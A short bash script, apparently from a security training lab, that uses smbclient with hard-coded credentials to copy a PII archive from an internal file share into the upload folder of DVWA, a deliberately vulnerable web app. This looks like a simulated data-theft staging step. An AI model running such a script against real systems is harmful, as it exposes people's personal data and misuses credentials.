#!/bin/bash
smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/www/html/dvwa/hackable/uploads; get PII.zip' -W HACKYSOC -U wier%frantic-Folly3 
echo 'Finished'